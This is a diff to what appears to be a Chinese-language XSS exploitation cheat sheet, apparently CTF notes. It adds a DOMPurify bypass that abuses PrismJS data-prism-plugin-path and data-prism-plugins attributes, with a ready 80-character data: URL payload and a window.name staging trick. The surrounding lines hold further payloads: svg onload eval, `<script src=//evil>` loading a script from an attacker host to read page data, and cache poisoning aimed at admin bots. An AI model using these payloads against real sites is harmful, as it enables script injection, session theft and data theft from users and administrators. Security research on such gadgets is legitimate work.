@@ -96,6 +96,17 @@ DOMPurify 绕过三模式：
 
 **Shadow DOM XSS**: ① closed shadow root 劫持——Proxy 包裹 `Element.prototype.attachShadow` 捕获 root 引用; ② 间接 eval `(0,eval)('code')` 逃逸 with(document) scope; ③ payload 走私进固定前缀字段（avatar URL）+ `avatar.slice(N)` 提取: `<svg/onload=(0,eval)('eval(avatar.slice(24))')>`; ④ 关键字过滤常漏 `</script>` 结构标签——闭合现有脚本上下文后 `<script src=//evil>` 外载，从 `document.scripts[].textContent` 读页面数据。
 
+**sanitizer 保留属性 → 库 gadget（DOM 属性当动态 import 配置）**: DOMPurify 默认放行 `data-*` 属性——净化后的文档里，**任何从 DOM 属性读取配置并拼进 `import()`/`fetch()`/URL 的前端库**都是脚本执行原语（这不是净化器解析 bug，是合法属性被库消费）。代表——PrismJS ESM global 构建（`src/global.js`，版本 ≥1.30 重构后）: 配置读取器查 `document.querySelector('[data-prism-<key>]')`，其中 `data-prism-plugins`（插件 id 列表，逗号分隔，**空属性值产生一个空 id**）与 `data-prism-plugin-path`（加载路径前缀）直接控制 `import(pluginPath + plugin + ".js")`。80 字符利用:
+```html
+<p data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)#>
+```
+- 空 `data-prism-plugins` → 插件列表 `[""]`; path 前缀指向 `data:text/javascript,import(name)#`
+- `import(path + "" + ".js")` 中 **`#` 是 URL fragment**——吞掉拼接的 `.js` 后缀，data: 主体保持 `import(name)`
+- `name` 解析为 `window.name`（跨导航持久的字符串槽）——预先在打开方页面把**第二个完整 data: 模块 URL** 存入 `window.name`，实现无引号加载任意 JS
+- 前提: CSP `script-src` 含 `data:`（或目标域允许）; 库以 `<script type=module>` 从 CDN 加载
+
+**gadget 复用模式**: 同一可控子域/同库应用的 gadget 可作为**跨应用攻击的 stage**——拿到任一 sibling 应用的此 gadget，即可在目标应用的 bot 流程中注入准备脚本（写 `window.name`、toss cookie 等），再导航到真正目标。审计清单: 逐个检查页面加载的库源码中 `getAttribute`/`dataset` → `import(`/`new URL(`/`fetch(` 的数据流。
+
 **Self-XSS 持久化提升链**: ① CSRF+Self-XSS→存储 XSS（跨站表单让受害者提交 payload）; ② 字段后渲染进管理面板/共享视图（工单用户名显示在管理员界面）; ③ CDN .js 扩展名共享缓存——用户名以 .js 结尾使 CDN 把 /profile/user.js 当静态资源缓存（不 Vary Cookie），自己访问一次污染边缘缓存，admin bot 之后拿到已认证 HTML（详见 cache-poisoning.md §8.1）。见到 self-XSS 查: 字段入库？渲染面？CSRF？扩展名？
 
 ## 6. 现代框架 + Trusted Types + Service Worker
